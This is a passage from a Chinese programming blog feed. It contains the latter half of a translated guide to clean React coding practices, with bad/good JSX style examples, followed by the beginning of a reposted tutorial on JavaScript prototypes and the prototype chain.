<h3 id="bad-6"><a href="#bad-6" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123;user.name&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123;user.age&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123;user.profession&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/&gt;</span></span>  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="good-5"><a href="#good-5" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; name, age, profession &#125; = user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123;name&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123;age&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123;profession&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/&gt;</span></span>  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="8-字符串类型的props不需要花括号"><a href="#8-字符串类型的props不需要花括号" class="headerlink" title="8. 字符串类型的props不需要花括号"></a>8. 字符串类型的props不需要花括号</h2><p>当向子组件传递字符串类型的props时。</p>
<h3 id="bad-7"><a href="#bad-7" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Navbar</span> <span class="attr">title</span>=<span class="string">&#123;</span>&quot;<span class="attr">My</span> <span class="attr">Special</span> <span class="attr">App</span>&quot;&#125; /&gt;</span></span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="good-6"><a href="#good-6" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Navbar</span> <span class="attr">title</span>=<span class="string">&quot;My Special App&quot;</span> /&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="9-从JSX中提取JS代码"><a href="#9-从JSX中提取JS代码" class="headerlink" title="9. 从JSX中提取JS代码"></a>9. 从JSX中提取JS代码</h3><p>如果JS代码没有渲染或UI功能目的，请将其从JSX中提取出来。</p>
<h3 id="bad-8"><a href="#bad-8" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;posts.map(post =&gt; (</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">li</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onClick</span>=<span class="string">&#123;event</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">          console.log(event.target, &#x27;clicked!&#x27;); // &lt;- 不好的</span></span><br><span class="line"><span class="language-xml">        &#125;&#125;</span></span><br><span class="line"><span class="language-xml">        key=&#123;post.id&#125;</span></span><br><span class="line"><span class="language-xml">      &gt;</span></span><br><span class="line"><span class="language-xml">        &#123;post.title&#125;  </span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    ))&#125;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">);</span></span><br></pre></td></tr></table></figure>

<h3 id="good-7"><a href="#good-7" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onClickHandler</span> = event =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">target</span>, <span class="string">&#x27;clicked!&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;posts.map(post =&gt; (</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">onClick</span>=<span class="string">&#123;onClickHandler&#125;</span> <span class="attr">key</span>=<span class="string">&#123;post.id&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;post.title&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span></span><br><span class="line"><span class="language-xml">    ))&#125;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="10-使用模板字符串"><a href="#10-使用模板字符串" class="headerlink" title="10. 使用模板字符串"></a>10. 使用模板字符串</h2><p>使用模板字符串构建大型字符串。避免使用字符串连接。它很漂亮,也很简洁。</p>
<h3 id="bad-9"><a href="#bad-9" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> userDetails = user.<span class="property">name</span> + <span class="string">&quot;&#x27;s profession is&quot;</span> + user.<span class="property">profession</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">section</span>&gt;</span>&#123;userDetails&#125;<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="good-8"><a href="#good-8" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> userDetails = <span class="string">`<span class="subst">$&#123;user.name&#125;</span>&#x27;s profession is <span class="subst">$&#123;user.profession&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">section</span>&gt;</span>&#123;userDetails&#125;<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line">); </span><br></pre></td></tr></table></figure>

<h2 id="11-按顺序导入"><a href="#11-按顺序导入" class="headerlink" title="11. 按顺序导入"></a>11. 按顺序导入</h2><p>尽量按一定顺序导入东西。这提高了代码的可读性。</p>
<h3 id="bad-10"><a href="#bad-10" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ErrorImg</span> <span class="keyword">from</span> <span class="string">&#x27;../../assets/images/error.png&#x27;</span>; </span><br><span class="line"><span class="keyword">import</span> styled <span class="keyword">from</span> <span class="string">&#x27;styled-components/native&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> colors <span class="keyword">from</span> <span class="string">&#x27;../../styles/colors&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">PropTypes</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;prop-types&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="good-9"><a href="#good-9" class="headerlink" title="good"></a>good</h3><p>一个经验法则是保持导入顺序如下:</p>
<ul>
<li>内置的</li>
<li>外部的</li>
<li>内部的</li>
</ul>
<p>所以上面的例子变为：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">PropTypes</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;prop-types&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> styled <span class="keyword">from</span> <span class="string">&#x27;styled-components/native&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ErrorImg</span> <span class="keyword">from</span> <span class="string">&#x27;../../assets/images/error.png&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> colors <span class="keyword">from</span> <span class="string">&#x27;../../styles/colors&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="12-使用隐式返回"><a href="#12-使用隐式返回" class="headerlink" title="12. 使用隐式返回"></a>12. 使用隐式返回</h2><p>在编写漂亮的代码时,使用 JavaScript 的隐式<code>return</code>特性。假设你的函数进行一个简单的计算并返回结果。</p>
<h3 id="bad-11"><a href="#bad-11" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">add</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="good-10"><a href="#good-10" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">add</span> = (<span class="params">a, b</span>) =&gt; a + b;</span><br></pre></td></tr></table></figure>

<h2 id="13-组件命名"><a href="#13-组件命名" class="headerlink" title="13. 组件命名"></a>13. 组件命名</h2><p>组件始终使用PascalCase，实例使用camelCase。</p>
<h3 id="bad-12"><a href="#bad-12" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> reservationCard <span class="keyword">from</span> <span class="string">&#x27;./ReservationCard&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ReservationItem</span> = <span class="language-xml"><span class="tag">&lt;<span class="name">ReservationCard</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="good-11"><a href="#good-11" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">ReservationCard</span> <span class="keyword">from</span> <span class="string">&#x27;./ReservationCard&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> reservationItem = <span class="language-xml"><span class="tag">&lt;<span class="name">ReservationCard</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="14-保留的prop命名"><a href="#14-保留的prop命名" class="headerlink" title="14. 保留的prop命名"></a>14. 保留的prop命名</h2><p>不要在组件之间传递props时使用DOM组件的prop名称，因为其他人可能不期望这些名称。</p>
<h3 id="bad-13"><a href="#bad-13" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">MyComponent</span> style=<span class="string">&quot;dark&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">MyComponent</span> <span class="attr">className</span>=<span class="string">&quot;dark&quot;</span> /&gt;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="good-12"><a href="#good-12" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">MyComponent</span> variant=<span class="string">&quot;fancy&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>

<h2 id="15-引号"><a href="#15-引号" class="headerlink" title="15. 引号"></a>15. 引号</h2><p>对 JSX 属性使用双引号，对所有其他 JS 使用单引号。</p>
<h3 id="bad-14"><a href="#bad-14" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">Foo</span> bar=<span class="string">&#x27;bar&#x27;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">Foo</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">left:</span> &quot;<span class="attr">20px</span>&quot; &#125;&#125; /&gt;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="good-13"><a href="#good-13" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">Foo</span> bar=<span class="string">&quot;bar&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">Foo</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">left:</span> &#x27;<span class="attr">20px</span>&#x27; &#125;&#125; /&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="16-prop命名"><a href="#16-prop命名" class="headerlink" title="16. prop命名"></a>16. prop命名</h2><p>始终使用camelCase作为prop名称，如果prop值为React组件，则使用PascalCase。</p>
<h3 id="bad-15"><a href="#bad-15" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">Component</span></span><br><span class="line">  <span class="title class_">UserName</span>=<span class="string">&quot;hello&quot;</span></span><br><span class="line">  phone_number=&#123;<span class="number">12345678</span>&#125; </span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure>

<h3 id="good-14"><a href="#good-14" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">MyComponent</span></span><br><span class="line">  userName=<span class="string">&quot;hello&quot;</span> </span><br><span class="line">  phoneNumber=&#123;<span class="number">12345678</span>&#125;</span><br><span class="line">  <span class="title class_">Component</span>=&#123;<span class="title class_">SomeComponent</span>&#125; </span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure>

<h2 id="17-把多行的JSX用括号包裹"><a href="#17-把多行的JSX用括号包裹" class="headerlink" title="17. 把多行的JSX用括号包裹"></a>17. 把多行的JSX用括号包裹</h2><p>如果组件跨多行,请始终将其包装在括号中。</p>
<h3 id="bad-16"><a href="#bad-16" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">MyComponent</span> <span class="attr">variant</span>=<span class="string">&quot;long&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">           <span class="tag">&lt;<span class="name">MyChild</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">MyComponent</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="good-15"><a href="#good-15" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">MyComponent</span> <span class="attr">variant</span>=<span class="string">&quot;long&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">MyChild</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">MyComponent</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="18-使用自闭合标签"><a href="#18-使用自闭合标签" class="headerlink" title="18. 使用自闭合标签"></a>18. 使用自闭合标签</h2><p>如果您的组件没有任何子组件，请使用自闭合标签。它提高了可读性。</p>
<h3 id="bad-17"><a href="#bad-17" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">SomeComponent</span> variant=<span class="string">&quot;stuff&quot;</span>&gt;&lt;/<span class="title class_">SomeComponent</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="good-16"><a href="#good-16" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">SomeComponent</span> variant=<span class="string">&quot;stuff&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>

<h2 id="19-方法名中不要使用下划线"><a href="#19-方法名中不要使用下划线" class="headerlink" title="19. 方法名中不要使用下划线"></a>19. 方法名中不要使用下划线</h2><p>不要在任何内部React方法中使用下划线。</p>
<h3 id="bad-18"><a href="#bad-18" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">_onClickHandler</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// do stuff</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="good-17"><a href="#good-17" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onClickHandler</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// do stuff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="20-alt属性"><a href="#20-alt属性" class="headerlink" title="20. alt属性"></a>20. alt属性</h2><p>在<code>&lt;img&gt;</code>标签中始终包含alt属性。并且不要在alt属性中使用<code>picture</code>或<code>image</code>,因为屏幕阅读器已经将<code>img</code>元素宣布为图像。不需要包含它们。</p>
<h3 id="bad-19"><a href="#bad-19" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;hello.jpg&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;hello.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Picture of me waving hello&quot;</span> /&gt;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="good-18"><a href="#good-18" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;hello.jpg&quot;</span> alt=<span class="string">&quot;Me waving hello&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>

<h2 id="21-优雅地使用CSS"><a href="#21-优雅地使用CSS" class="headerlink" title="21. 优雅地使用CSS"></a>21. 优雅地使用CSS</h2><p>写行内样式太麻烦了，且不易维护。由于在 <code>React</code> 中 <code>CSS</code> 没有像 <code>Vue</code> 中的作用域 <code>(scoped)</code> 概念， 如果使用直接引入的方式那么所有的 <code>CSS</code> 样式都是作用域全局的，这样就使 <code>CSS</code> 异常的混乱，有可能导致页面样式相互影响。</p>
<h3 id="bad-20"><a href="#bad-20" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> bodyStyle = &#123;</span><br><span class="line">  <span class="attr">height</span>: <span class="string">&quot;10px&quot;</span>  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">section</span> <span class="attr">style</span>=<span class="string">&#123;bodyStyle&#125;</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="good-19"><a href="#good-19" class="headerlink" title="good"></a>good</h3><p>在 <code>react-scripts@2.0.0</code> 或者更高的版本中已经支持 <code>CSS</code> 的模块化了 (也就不需要手动去修改 <code>webpack.config.js</code> 中的配置了)，你只需要以 <code>[name].module.css</code> 方式命名就可以了。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* index.module.css */</span></span><br><span class="line"><span class="selector-class">.body</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">10px</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>组件里面使用：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">&#x27;./index.module.css&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">section</span> <span class="attr">className</span>=<span class="string">&#123;styles.body&#125;</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure>

<p>就是这样啦。如果您已经做到了这一步，那么恭喜您！我希望您从本文中学到一两件事。</p>
<p>我希望您有一个美好的一天！:D</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://dev.to/mohammadfaisal/21-best-practices-for-a-clean-react-project-jdf">21 Best Practices for a Clean React Project</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>彻底搞清楚 JavaScript 的原型和原型链</title>
    <url>/2023/08/19/20230819-%E5%BD%BB%E5%BA%95%E6%90%9E%E6%B8%85%E6%A5%9A-JavaScript-%E7%9A%84%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/</url>
    <content><![CDATA[<p>JavaScript真的挺无语的，怪不得看了那么多的介绍文章还是一头雾水，直到自己终于弄懂了一点点之后才深有体会：<br>先从整体说起吧，发现没有基础做依据，那都是空中楼阁；<br>先从基础开始介绍吧，又发现基础是个蛇头咬蛇尾的圆环，无从下手，应该先整体介绍。<br>于是介绍本身就成了一个死循环。。。</p>
<span id="more"></span>

<div class="note info"><p>文章转载自<a href="https://www.cnblogs.com/jyk/">金色海洋工作室</a></p>
</div>

<p>还是尝试着从基础开始。。。（多图预警）</p>
<h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
<li>对象的继承树</li>
<li>函数的继承树</li>
<li>函数 VS 对象</li>
<li><code>prototype</code> VS <code>__proto__</code></li>
<li>继承 VS 组合</li>
<li>自己定义函数（class），以及实现继承</li>
</ul>
<h2 id="寻找原型链的“源头”"><a href="#寻找原型链的“源头”" class="headerlink" title="寻找原型链的“源头”"></a>寻找原型链的“源头”</h2><p>网上有一个梗：万物基于MIUI。虽然是一句调侃，但是也表达源头的重要性。</p>
<p>看过一些高手写的关系图，应该是非常专业，但也正是因为太专业了，所以才导致新手看的是一头雾水。<br>那么对于先手来说，有没有简单一点的方式呢？我们可以借鉴一下面向对象的思路。</p>
<p>提到面向对象，大家都会想到基类（超类、父类）、子类、继承、多态等。为啥容易记住呢？因为继承关系非常简单，从基类开始，一层一层继承下去，结构非常清晰明了。</p>
<p>我觉得应该借鉴一下这种表达方式，也许这种方式并不契合JavaScript，但是我觉得应该比较方便初学者入门。</p>
<p>经常听说，JavaScript 的世界是基于 Object 的，这句话对但是又不对，为啥这么说呢？我们来看看 Object 的结构：（使用 console.dir() 可以看到细节 ）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Object</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.huatree.top/image-20230819140318738.png" alt="image-20230819140318738"></p>
<p>首先请注意一下那个 <em>f</em> 的标识，这表示 Object 其实是一个函数（从 JavaScript 的语法角度来看），我们来验证一下：</p>
<p><img src="https://cdn.huatree.top/image-20230819140433456.png" alt="image-20230819140433456"></p>
<p>这到底是怎么回事呢？后面细说，先把找到源头才好理解。</p>
<p>这个 Object 并不是源头，因为还有 prototype 和 __proto__， 我们先看看 Object.prototype 的结构：</p>
<h3 id="Object-prototype"><a href="#Object-prototype" class="headerlink" title="Object.prototype"></a>Object.prototype</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.huatree.top/image-20230819141336724.png" alt="image-20230819141336724"></p>
<p>可以看到，Object.prototype 才是源头，因为 Object.prototype 没有 prototype（当然没有），<code>__proto__</code> 也是 null，我们来验证一下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.huatree.top/image-20230819141417425.png" alt="image-20230819141417425"></p>
<h3 id="Object-proto"><a href="#Object-proto" class="headerlink" title="Object.__proto __"></a>Object.<code>__proto __</code></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Object</span>.<span class="property">__proto__</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.huatree.top/image-20230819142105214.png" alt="image-20230819142105214"></p>
<p>这是啥？是不是很头晕，这个其实指向的是Function的原型，我们来验证一下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property">__proto__</span> === <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.huatree.top/image-20230819142320288.png" alt="image-20230819142320288"></p>
<p>这是咋回事？后面再解释。</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>是不是有点晕，让我们来梳理一下思路：</p>
<p><img src="https://cdn.huatree.top/image-20230819155326568.png" alt="image-20230819155326568"></p>
<p>如果看上面的图有点晕的话，可以先看下面的图，红线说的是构造函数的关系，可以先跳过。（终于画出来了那种绕圈圈的图，向着专业又迈出了一步）</p>
<p><img src="https://cdn.huatree.top/image-20230819160149157.png" alt="image-20230819160149157"></p>
<ul>
<li>思路一：<br>Object有两个属性，一个是对象原型，一个是函数原型。</li>
<li>思路二：<br>Object有两个指针，一个指向对象原型，一个指向函数原型。</li>
</ul>
<p>我觉得思路二更适合一些，这个是理解 JavaScript 的原型链的第一个门槛，如果绕不清楚的话……没关系，往下看就好，我也是把下面都写出来，然后回头才整理出来这个图的。。。（这个也是给继承和组合做个铺垫）</p>
<h2 id="构建一颗大树-——-对象的继承关系"><a href="#构建一颗大树-——-对象的继承关系" class="headerlink" title="构建一颗大树 —— 对象的继承关系"></a>构建一颗大树 —— 对象的继承关系</h2><p>找到源头之后，我们就可以构建一颗大树了。</p>
<p>构建原则：xxx.prototype.<code>__proto__</code> &#x3D;&#x3D;&#x3D; Object.prototype</p>
<p>即：Object.prototype 看做父类，然后把其“子类”画出来。</p>
<p><img src="https://cdn.huatree.top/image-20230819164038834.png" alt="image-20230819164038834"></p>
<p>这下是不是清晰多了呢？我们来验证一下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.huatree.top/image-20230819164504341.png" alt="image-20230819164504341"></p>
<p>好长好长，差点截不下来。剩下的自己下来测试验证啦。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Number</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">BigInt</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Boolean</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Symbol</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Date</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">RegExp</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="title class_">Math</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br></pre></td></tr></table></figure>

<h3 id="共同点"><a href="#共同点" class="headerlink" title="共同点"></a>共同点</h3><p>每种类型都有自己的成员，然后<code>__proto__</code> 指向 Object.prototype。</p>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>这里有几个特殊情况：</p>
<ul>
<li>Math<br>没有原型，或者说原型就是 Math 自己。</li>
<li>Array<br>这个比较奇怪。</li>
<li>null 和 undefined<br>这对兄弟先当做特殊情况来处理。</li>
